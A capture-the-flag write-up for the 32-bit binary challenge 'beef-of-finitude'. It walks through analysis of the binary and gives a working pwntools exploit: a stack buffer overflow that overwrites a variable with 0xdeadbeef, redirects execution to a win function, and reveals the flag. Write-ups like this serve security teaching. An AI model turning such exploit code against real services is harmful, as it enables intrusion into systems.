## beef-of-finitude (100)

### Description  
> Fun for all ages

> challenges.ctfd.io:30027

### Gathering information  
We are given an executable and a remote service to exploit.

Let's inspect the binary.

```console  
> file bof.out  
bof.out: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically
linked, interpreter /lib/ld-linux.so.2,
BuildID[sha1]=0a74e270e67dbd80d4fbed7d3fc1dfda9f48fee4, for GNU/Linux 3.2.0,
not stripped  
```  
The binary is not stripped and with `nm` we can already see some interesting
functions:

```console  
> nm bof.out  
...  
0804c034 B flag  
...  
08049405 T main  
0804934e T myFun  
...  
08049236 T win  
...  
```

Let's check for security measures:

```console  
> checksec bof.out  
   Arch:     i386-32-little  
   RELRO:    Partial RELRO  
   Stack:    No canary found  
   NX:       NX enabled  
   PIE:      No PIE (0x8048000)  
```  
No Stack canaries and PIE, this could be an easy buffer overflow if we have a
vulnerable function.

By looking at the binary symbols or by running the program with `ltrace` we
can see that the user input is taken via `fgets`.

`fgets` reads in at most one less than the specified argument of characters
from a stream and stores them into the specified buffer.

We are *lucky* since the guard is way to high to prevent a buffer overflow on
the array where our input will be saved.

Let's inspect the binary in `Ghidra` to see if we can gather more information
about the previously seen functions.

*myFun*:

```c  
void myFun(void)  
{  
       char second_buffer[10];  
       char first_buffer[16];  
       int var_to_change = 7;

       puts("Enter your Name: ");  
       fgets(first_buffer, 16, stdin);  
       puts("Enter your password: ");  
       fgets(second_buffer, 336, stdin);  
       if (var_to_change == -0x21524111)  // 0xdeadbeef  
       {  
               flag = 1;  
               puts("Wow you overflowed the right value! Now try to find the flag !\n");  
       }  
       else   
       {  
               puts("Try again!\n");  
       }  
       return;  
}  
```

And *win*:

```c  
void win(uint param_1,uint param_2,uint param_3,uint param_4)  
{  
       char flag_buffer [256];  
       FILE *file_ptr;

       if ((((param_2 | param_1 ^ 0x14b4da55) == 0) && ((param_3 ^ 0x67616c66 | param_4) == 0)) && (flag == 1))   
       {  
               file_ptr = fopen("./flag.txt","r");  
               if (file_ptr == (FILE *)0x0)   
               {  
                       puts("flag.txt not found - ping us on discord if this is happening on the shell server\n");  
               }  
               else   
               {  
                       fgets(flag_buffer,0x100,file_ptr);  
                       printf("flag: %s\n",flag_buffer);  
               }  
               return;  
       }  
       puts("Close, but not quite.\n");  
       exit(1);  
}  
```

So, as an high level overview, we need to:

1. Trigger a buffer overflow  
2. Rewrite the variable checked against `0xdeadbeef` on the `myFun` function  
3. Rewrite the instruction pointer to redirect the execution to the `win` function  
4. Set the right arguments to pass the if-statement and trigger the `fopen` call

### Exploitation  
We can write a script with `pwntools` to exploit the remote server:

```python  
#!/usr/bin/env python3

from pwn import *

e = context.binary = ELF("./bof.out")  
io = remote("challenges.ctfd.io", 30027)

OFFSET_TO_VAR = 41  
OFFSET_TO_IP  = 12

pad_1 = b"A" * OFFSET_TO_VAR  
pad_2 = b"A" * OFFSET_TO_IP

stack_frame =  p32(e.symbols["win"])  
stack_frame += p32(e.symbols["exit"])  
stack_frame += p32(0x14b4da55)                  # param_1  
stack_frame += p32(0)                           # param_2  
stack_frame += p32(0x67616c66)                  # param_3  
stack_frame += p32(0)                           # param_4  
info(f"{stack_frame = }")

payload = pad_1 + p32(0xdeadbeef) + pad_2 + stack_frame  
info(f"{payload = }")

io.sendline(payload)  
io.recvuntil(b"flag:")  
flag = io.recvline().strip().decode()  
io.close()

success(f"{flag = }")  
```

### The Flag  
`UDCTF{0bl1g4t0ry_buff3r_ov3rflow}`

### Conclusion  
This challenge neatly demonstrates a simple buffer overflow, with an
overwriting of a local variable and passing parameters to a function to get
our flag.